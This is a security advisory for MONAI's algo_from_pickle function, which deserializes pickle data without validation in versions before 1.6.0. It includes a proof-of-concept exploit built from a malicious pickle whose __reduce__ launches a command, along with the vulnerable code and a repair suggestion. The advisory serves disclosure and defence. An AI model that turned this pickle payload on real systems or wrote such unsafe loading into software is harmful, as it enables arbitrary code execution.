# [H] MONAI: Unsafe functions lead to pickle deserialization rce

## Summary
Severity: High
Advisory: GHSA-89gg-p5r5-q6r4
CWE: CWE-502
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:H/PR:H/UI:R/S:C/C:H/I:H/A:H (CVSS_V3)
Published: 2026-04-07
Source: https://github.com/advisories/GHSA-89gg-p5r5-q6r4
Type: github-advisory

## Affected
- PyPI: `monai` — affected >=0 <1.6.0

## Details
### Summary
The `algo_from_pickle` function in `monai/auto3dseg/utils.py` causes `pickle.loads(data_bytes)` to be executed, and it does not perform any validation on the input parameters. This ultimately leads to insecure deserialization and can result in code execution vulnerabilities.

### Details
poc
```
import pickle
import subprocess
class MaliciousAlgo:
    def __reduce__(self):
        return (subprocess.call, (['calc.exe'],))
malicious_algo_bytes = pickle.dumps(MaliciousAlgo())

attack_data = {
    "algo_bytes": malicious_algo_bytes,  
     
}
attack_pickle_file = "attack_algo.pkl"
with open(attack_pickle_file, "wb") as f:
    f.write(pickle.dumps(attack_data))

```
Generate the malicious file "attack_algo.pkl" through POC.

```
from monai.auto3dseg.utils import algo_from_pickle


attack_pickle_file = "attack_algo.pkl"
result = algo_from_pickle(attack_pickle_file)
```
Ultimately, it will trigger pickle.load through a file to identify the command execution.

<img width="909" height="534" alt="image" src="https://github.com/user-attachments/assets/071adbb7-3e40-4651-be48-abd2ce32470f" />

Causes of the vulnerability:
```
def algo_from_pickle(pkl_filename: str, template_path: PathLike | None = None, **kwargs: Any) -> Any:

    with open(pkl_filename, "rb") as f_pi:
            data_bytes = f_pi.read()
        data = pickle.loads(data_bytes)

```



### Impact
Arbitrary code execution

Repair suggestions
Verify the data source and content before deserializing, or use a safe deserialization method

## References
- https://github.com/Project-MONAI/MONAI/security/advisories/GHSA-89gg-p5r5-q6r4
- https://github.com/Project-MONAI/MONAI/issues/8874#issuecomment-4752023161
- https://github.com/Project-MONAI/MONAI/commit/9078a72f3992e49bd4560db510be9ec4ccf972cc
- https://github.com/Project-MONAI/MONAI
- https://github.com/Project-MONAI/MONAI/releases/tag/1.6.0
